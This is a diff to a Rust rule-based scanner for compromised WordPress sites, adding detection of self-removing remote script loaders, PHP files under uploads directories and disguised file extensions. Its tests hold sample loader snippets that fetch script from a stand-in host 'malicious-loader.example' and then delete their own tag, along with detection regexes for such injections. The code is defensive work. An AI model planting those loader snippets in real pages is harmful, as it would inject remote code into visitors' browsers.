@@ -19,9 +19,9 @@ use regex::bytes::{Regex, RegexSet, RegexSetBuilder};
 /// Bumped whenever a rule changes; a bump re-inspects the Layer B scope once.
 pub const RULE_PACK_VERSION: u32 = 1;
 
-/// Bytes of one file that are inspected. A larger PHP file is reported as
-/// `too_large_to_inspect` (never skipped silently); only the first
-/// `INSPECT_MAX_BYTES` of it are matched.
+/// Bytes of one file that are inspected. A larger inspected file (PHP,
+/// JavaScript, HTML) is reported as `too_large_to_inspect` (never skipped
+/// silently); only the first `INSPECT_MAX_BYTES` of it are matched.
 pub const INSPECT_MAX_BYTES: usize = 2 * 1024 * 1024;
 
 const MAX_HITS: usize = 20;
@@ -31,8 +31,14 @@ const SNIPPET_CHARS: usize = 120;
 /// the match, so a one-line 2 MiB bundle costs the same as a short file.
 const DOMAIN_WINDOW: usize = 4096;
 
+/// Extensions that make a file PHP-like as the final extension.
 const PHP_EXTS: [&str; 11] = [
     "php", "phtml", "phar", "php3", "php4", "php5", "php6", "php7", "php8", "pht", "inc",
+];
+/// Extensions that also count in the middle of a name (`x.php.jpg`): the
+/// handler-mapped ones. `inc` and `pht` are not, so `x.inc.pdf` is a PDF.
+const PHP_MID_EXTS: [&str; 9] = [
+    "php", "phtml", "phar", "php3", "php4", "php5", "php6", "php7", "php8",
 ];
 const SCRIPT_EXTS: [&str; 5] = ["js", "mjs", "cjs", "html", "htm"];
 
@@ -107,18 +113,28 @@ const RULES: &[Rule] = &[
         also: None,
     },
     Rule {
+        id: "footer_hook_payload",
+        severity: Severity::High,
+        scope: Scope::Php,
+        pattern: r#"(?i-u)\badd_action\s*\(\s*['"](?:wp_footer|wp_head)['"]"#,
+        also: Some(PAYLOAD_LITERAL),
+    },
+    Rule {
+        id: "js_self_removing_loader",
+        severity: Severity::High,
+        scope: Scope::Script,
+        // The incident's behaviour: a script element with a remote src that
+        // removes its own tag afterwards. Plain widget loaders (chat, analytics)
+        // leave their tag in place and stay at js_remote_script.
+        pattern: r#"(?i-u)createElement\s*\(\s*['"]script['"]\s*\)(?s:.){0,300}?(?:\.src\s*=|setAttribute\s*\(\s*['"]src['"]\s*,)\s*['"]?(?:https?:)?//[a-z0-9](?s:.){0,300}?(?:removeChild\s*\(|\.remove\s*\(\s*\))"#,
+        also: None,
+    },
+    Rule {
         id: "encoded_literal_large",
         severity: Severity::Medium,
         scope: Scope::Php,
         pattern: BIG_LITERAL,
         also: None,
-    },
-    Rule {
-        id: "footer_hook_payload",
-        severity: Severity::Medium,
-        scope: Scope::Php,
-        pattern: r#"(?i-u)\badd_action\s*\(\s*['"](?:wp_footer|wp_head)['"]"#,
-        also: Some(PAYLOAD_LITERAL),
     },
     Rule {
         id: "js_remote_script",
@@ -173,13 +189,31 @@ fn build_pack() -> Result<Pack, regex::Error> {
 #[allow(clippy::expect_used)]
 static PACK: LazyLock<Pack> = LazyLock::new(|| build_pack().expect("rule pack patterns compile"));
 
-/// PHP can run under this name: a PHP extension on the file name, or a PHP
-/// extension followed by more (`x.php.jpg`, which older Apache setups execute).
+/// PHP can run under this name: a PHP extension as the final extension, or a
+/// handler-mapped one followed by more (`x.php.jpg`, which older Apache setups
+/// execute). `inc` and `pht` count only as the final extension.
 pub fn is_php_like(rel_path: &str) -> bool {
     let name = rel_path.rsplit('/').next().unwrap_or(rel_path);
-    name.split('.')
-        .skip(1)
-        .any(|ext| PHP_EXTS.iter().any(|e| ext.eq_ignore_ascii_case(e)))
+    let mut exts = name.split('.').skip(1).peekable();
+    while let Some(ext) = exts.next() {
+        let set: &[&str] = if exts.peek().is_none() {
+            &PHP_EXTS
+        } else {
+            &PHP_MID_EXTS
+        };
+        if set.iter().any(|e| ext.eq_ignore_ascii_case(e)) {
+            return true;
+        }
+    }
+    false
+}
+
+/// A directory named exactly `uploads` anywhere in the path: nested installs
+/// (`blog/wp-content/uploads/`) and non-WordPress layouts count.
+fn under_uploads(rel_path: &str) -> bool {
+    let mut parts = rel_path.split('/');
+    parts.next_back();
+    parts.any(|c| c == "uploads")
 }
 
 fn is_script_like(rel_path: &str) -> bool {
@@ -201,19 +235,24 @@ fn is_core_lookalike(rel_path: &str) -> bool {
 }
 
 /// Inspect one file. `rel_path` is relative to the document root. Only PHP-like,
-/// JavaScript and HTML files get content rules; any PHP-like file under
-/// `wp-content/uploads/` is a finding by its path alone. Never panics and never
-/// returns more than 20 hits, sorted by line.
+/// JavaScript and HTML files get content rules; any PHP-like file under a
+/// directory named `uploads` is a finding by its path alone. Never panics and
+/// never returns more than 20 hits, sorted by line.
+///
+/// Only the first `INSPECT_MAX_BYTES` are matched. The caller must pass up to
+/// `INSPECT_MAX_BYTES + 1` bytes of the file: the extra byte is what raises
+/// `too_large_to_inspect`, so a caller that truncates at the cap exactly never
+/// sees the signal.
 pub fn inspect(rel_path: &str, bytes: &[u8]) -> Vec<RuleHit> {
     let php = is_php_like(rel_path);
     let script = php || is_script_like(rel_path);
     let body = &bytes[..bytes.len().min(INSPECT_MAX_BYTES)];
 
     let mut hits: Vec<RuleHit> = Vec::new();
-    if php && rel_path.starts_with("wp-content/uploads/") {
+    if php && under_uploads(rel_path) {
         hits.push(path_hit("php_in_uploads", Severity::High, rel_path));
     }
-    if php && bytes.len() > INSPECT_MAX_BYTES {
+    if script && bytes.len() > INSPECT_MAX_BYTES {
         hits.push(path_hit(
             "too_large_to_inspect",
             Severity::Medium,
@@ -227,7 +266,7 @@ pub fn inspect(rel_path: &str, bytes: &[u8]) -> Vec<RuleHit> {
     // Match positions per rule, High rules first, bounded by MAX_HITS each.
     let pack = &*PACK;
     let mut found: Vec<(&Compiled, Vec<(usize, usize)>)> = Vec::new();
-    let mut medium_start: Option<usize> = None;
+    let mut first_start: Option<usize> = None;
     for idx in pack.set.matches(body).iter() {
         let c = &pack.rules[idx];
         if c.rule.scope == Scope::Php && !php {
@@ -244,14 +283,12 @@ pub fn inspect(rel_path: &str, bytes: &[u8]) -> Vec<RuleHit> {
         if spans.is_empty() {
             continue;
         }
-        if c.rule.severity == Severity::Medium {
-            medium_start = Some(medium_start.map_or(spans[0].0, |m| m.min(spans[0].0)));
-        }
+        first_start = Some(first_start.map_or(spans[0].0, |m| m.min(spans[0].0)));
         found.push((c, spans));
     }
 
-    // A core-looking name outside core plus a medium rule: the name is the disguise.
-    if let (Some(start), true) = (medium_start, is_core_lookalike(rel_path)) {
+    // A core-looking name outside core plus any content rule: the name is the disguise.
+    if let (Some(start), true) = (first_start, is_core_lookalike(rel_path)) {
         let name = rel_path.rsplit('/').next().unwrap_or(rel_path);
         let mut h = path_hit("core_name_decoy", Severity::Medium, name);
         h.line = line_of(body, start);
@@ -408,22 +445,25 @@ mod tests {
     }
 
     #[test]
-    fn appended_js_loader_is_at_least_medium() {
+    fn appended_js_loader_is_high() {
         let h = inspect("wp-content/themes/x/app.js", fx!("appended_js_loader.js"));
-        assert!(worst(&h) >= Some(Severity::Medium), "{h:?}");
+        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
         assert!(ids(&h).contains(&"js_remote_script"));
-        let hit = h.iter().find(|h| h.rule_id == "js_remote_script").unwrap();
+        let hit = h
+            .iter()
+            .find(|h| h.rule_id == "js_self_removing_loader")
+            .unwrap();
         assert!(hit.domains.iter().any(|d| d == HOST), "{:?}", hit.domains);
         assert_eq!(hit.line, 3);
     }
 
     #[test]
-    fn footer_hook_with_encoded_literal_is_at_least_medium() {
+    fn footer_hook_with_encoded_literal_is_high() {
         let h = inspect(
             "wp-content/themes/x/functions.php",
             fx!("functions_footer.php"),
         );
-        assert!(worst(&h) >= Some(Severity::Medium), "{h:?}");
+        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
         assert!(ids(&h).contains(&"footer_hook_payload"));
         assert!(ids(&h).contains(&"encoded_literal_large"));
         let hit = h
@@ -537,6 +577,36 @@ mod tests {
     }
 
     #[test]
+    fn php_under_nested_or_non_wp_uploads_is_high() {
+        for p in [
+            "blog/wp-content/uploads/2024/x.php",
+            "sub/site/wp-content/uploads/x.phtml",
+            "uploads/x.php",
+            "app/uploads/deep/er/x.php.jpg",
+            "wp-content/uploads/sites/2/x.PHP",
+        ] {
+            let h = inspect(p, b"<?php // nothing\n");
+            assert_eq!(ids(&h), ["php_in_uploads"], "{p}");
+            assert_eq!(h[0].severity, Severity::High);
+        }
+    }
+
+    #[test]
+    fn uploads_must_be_a_whole_directory_name() {
+        for p in [
+            "my-uploads/x.php",
+            "wp-content/uploads-old/x.php",
+            "wp-content/Uploads/x.php",
+            // A file called uploads is not a directory.
+            "wp-content/uploads",
+            "wp-content/uploads.php",
+        ] {
+            let h = inspect(p, b"<?php // nothing\n");
+            assert!(!ids(&h).contains(&"php_in_uploads"), "{p}: {h:?}");
+        }
+    }
+
+    #[test]
     fn php_under_uploads_ignores_other_dirs_and_non_php() {
         assert!(inspect("wp-content/plugins/p/image.php", b"<?php // nothing\n").is_empty());
         assert!(inspect("wp-content/uploads/2024/05/image.jpg", b"\xff\xd8\xff\xe0").is_empty());
@@ -584,6 +654,60 @@ mod tests {
         assert!(is_php_like("a.b.phtml.bak"));
         let h = inspect("wp-content/uploads/2024/x.php.jpg", b"GIF89a");
         assert_eq!(ids(&h), ["php_in_uploads"]);
+    }
+
+    #[test]
+    fn inc_and_pht_count_only_as_the_final_extension() {
+        for p in ["x.inc", "x.pht", "a/b.pdf.inc", "a.php.pht", "x.INC"] {
+            assert!(is_php_like(p), "{p}");
+        }
+        for p in ["x.inc.pdf", "x.pht.jpg", "a.inc.b.txt"] {
+            assert!(!is_php_like(p), "{p}");
+        }
+        for p in [
+            "x.php.jpg",
+            "x.php5.pdf",
+            "x.phar.gz",
+            "x.phtml.txt",
+            "x.php8.bak",
+        ] {
+            assert!(is_php_like(p), "{p}");
+        }
+        let h = inspect("wp-content/uploads/2024/scan.inc.pdf", b"%PDF-1.4");
+        assert!(h.is_empty(), "{h:?}");
+        let h = inspect("wp-content/uploads/2024/x.inc", b"data");
+        assert_eq!(ids(&h), ["php_in_uploads"]);
+    }
+
+    #[test]
+    fn plain_remote_widget_loader_is_medium_not_high() {
+        let tawk = b"var Tawk_API=Tawk_API||{},Tawk_LoadStart=new Date();(function(){var s1=document.createElement(\"script\"),s0=document.getElementsByTagName(\"script\")[0];s1.async=true;s1.src='https://embed.tawk.to/0000000000/default';s1.charset='UTF-8';s1.setAttribute('crossorigin','*');s0.parentNode.insertBefore(s1,s0);})();";
+        let h = inspect("wp-content/themes/x/chat.js", tawk);
+        assert_eq!(ids(&h), ["js_remote_script"], "{h:?}");
+        assert_eq!(h[0].severity, Severity::Medium);
+        assert_eq!(h[0].domains, ["embed.tawk.to"]);
+        // Same shape in a PHP footer template stays Medium too.
+        let crisp = b"<?php add_action('wp_footer', function () { echo '<script>window.$crisp=[];var d=document,s=d.createElement(\"script\");s.src=\"https://client.crisp.chat/l.js\";s.async=1;d.getElementsByTagName(\"head\")[0].appendChild(s);</script>'; });";
+        let h = inspect("wp-content/themes/x/functions.php", crisp);
+        assert_eq!(worst(&h), Some(Severity::Medium), "{h:?}");
+    }
+
+    #[test]
+    fn self_removing_remote_loader_variants_are_high() {
+        for src in [
+            &br#"var s=document.createElement('script');s.setAttribute('src','//malicious-loader.example/a.js');document.body.appendChild(s);s.remove();"#[..],
+            br#"var s=document.createElement("script");s.src="https://malicious-loader.example/a.js";document.head.appendChild(s);document.head.removeChild(s);"#,
+        ] {
+            let h = inspect("a.js", src);
+            assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
+            assert!(ids(&h).contains(&"js_self_removing_loader"));
+        }
+        // Removal of a script that is not remote does not count.
+        let h = inspect(
+            "a.js",
+            b"var s=document.createElement('script');s.src='/local.js';document.head.appendChild(s);s.remove();",
+        );
+        assert!(h.is_empty(), "{h:?}");
     }
 
     #[test]
@@ -687,17 +811,17 @@ mod tests {
     }
 
     #[test]
-    fn core_named_decoy_with_medium_rule_is_flagged() {
+    fn core_named_decoy_with_a_content_hit_is_flagged() {
         let mut src = b"<?php\nadd_action('wp_footer','x');\n$b='".to_vec();
         src.extend(std::iter::repeat_n(b'Q', 400));
         src.extend_from_slice(b"';\n");
         let h = inspect("wp-content/plugins/p/class-wp-http-cache.php", &src);
         assert!(ids(&h).contains(&"footer_hook_payload"), "{h:?}");
         assert!(ids(&h).contains(&"core_name_decoy"), "{h:?}");
-        // Same content under a neutral name: the medium rule only.
+        // Same content under a neutral name: no decoy hit.
         let h = inspect("wp-content/plugins/p/helpers.php", &src);
         assert!(!ids(&h).contains(&"core_name_decoy"));
-        // A core-looking name with nothing medium in it is not a finding.
+        // A core-looking name with no content hit is not a finding.
         assert!(inspect("wp-content/plugins/p/class-wp-thing.php", b"<?php echo 1;").is_empty());
     }
 
@@ -741,15 +865,25 @@ mod tests {
     }
 
     #[test]
-    fn oversize_php_is_reported_not_skipped() {
+    fn oversize_inspected_files_are_reported_not_skipped() {
         let big = vec![b' '; INSPECT_MAX_BYTES + 1];
-        let h = inspect("a.php", &big);
+        for p in ["a.php", "a.js", "a.mjs", "a.cjs", "a.html", "a.htm"] {
+            let h = inspect(p, &big);
+            assert_eq!(ids(&h), ["too_large_to_inspect"], "{p}");
+            assert_eq!(h[0].severity, Severity::Medium);
+            // Exactly at the cap is inspected, not flagged.
+            assert!(inspect(p, &big[..INSPECT_MAX_BYTES]).is_empty(), "{p}");
+        }
+        // Types that are never inspected stay silent.
+        assert!(inspect("a.txt", &big).is_empty());
+    }
+
+    #[test]
+    fn loader_appended_past_the_cap_is_not_read_as_clean() {
+        let mut big = vec![b' '; INSPECT_MAX_BYTES];
+        big.extend_from_slice(fx!("appended_js_loader.js"));
+        let h = inspect("wp-content/themes/x/bundle.js", &big);
         assert_eq!(ids(&h), ["too_large_to_inspect"]);
-        assert_eq!(h[0].severity, Severity::Medium);
-        // Exactly at the cap is inspected, not flagged.
-        assert!(inspect("a.php", &big[..INSPECT_MAX_BYTES]).is_empty());
-        // Non-PHP past the cap is cut, not flagged.
-        assert!(inspect("a.js", &big).is_empty());
     }
 
     #[test]
